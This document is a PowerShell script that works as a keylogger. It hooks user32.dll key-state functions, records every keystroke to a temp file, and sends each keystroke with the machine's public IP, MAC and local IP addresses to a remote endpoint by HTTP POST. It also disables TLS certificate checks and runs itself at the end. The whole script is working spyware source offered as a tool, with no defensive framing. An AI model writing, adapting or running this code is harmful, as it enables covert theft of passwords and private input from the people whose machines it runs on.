
function SendStuff($stuff = "",$PublicIP, $macs, $ips,$url) {	

	# Disable certificate validation (use with caution and only in test environments)
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

   $url="http://localhost:8000"
$headers = @{
    "Content-Type" = "application/json"
    "Authorization" = "Bearer YOUR_ACCESS_TOKEN"
}
$body = @{
    "pub" = "$PublicIP"
    "ip" = "$ips"
	"mac" = "$macs"
	"stuff" = "$stuff"
} | ConvertTo-Json
try {
$response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body
  }
    finally {
       #TODO auto restart/(Foobar call) and send again.
		
    }
# Re-enable certificate validation
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $null }
	
}

function Foobar($adds) {
	$Path="$env:temp\keylogger.txt"
$PublicIP = Invoke-RestMethod -Uri "https://api.ipify.org"
$macs = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where {$_.Caption -like "*Ethernet*"}).MACAddress
$ips = Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" -or $_.AddressFamily -eq "IPv6" } | Select-Object IPAddress

    $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    # load signatures and make members available
    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

    # create output file
    $null = New-Item -Path $Path -ItemType File -Force

    try {
        #comment this line:
        Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red

        # create endless loop. When user presses CTRL+C, finally-block
        # executes and shows the collected key presses
        while ($true) {
            Start-Sleep -Milliseconds 40

            # scan all ASCII codes above 8
            for ($ascii = 9; $ascii -le 254; $ascii++) {
                # get current key state
                $state = $API::GetAsyncKeyState($ascii)

                # is key pressed?
                if ($state -eq -32767) {
                    $null = [console]::CapsLock

                    # translate scan code to real code
                    $virtualKey = $API::MapVirtualKey($ascii, 3)

                    # get keyboard state for virtual keys
                    $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
                    $checkkbstate = $API::GetKeyboardState($kbstate)

                    # prepare a StringBuilder to receive input key
                    $mychar = New-Object -TypeName System.Text.StringBuilder

                    # translate virtual key
                    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                    if ($success) {
						#send key stroke 
						SendStuff $mychar $PublicIP $macs $ips $adds
                        # add key to logger file
                        [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                    }
                }
            }
        }
    }
    finally {
        # open logger file in Notepad
        #notepad $Path
		SendStuff $Path $PublicIP $macs $ips $adds
		
    }
}
Foobar  -a $a 


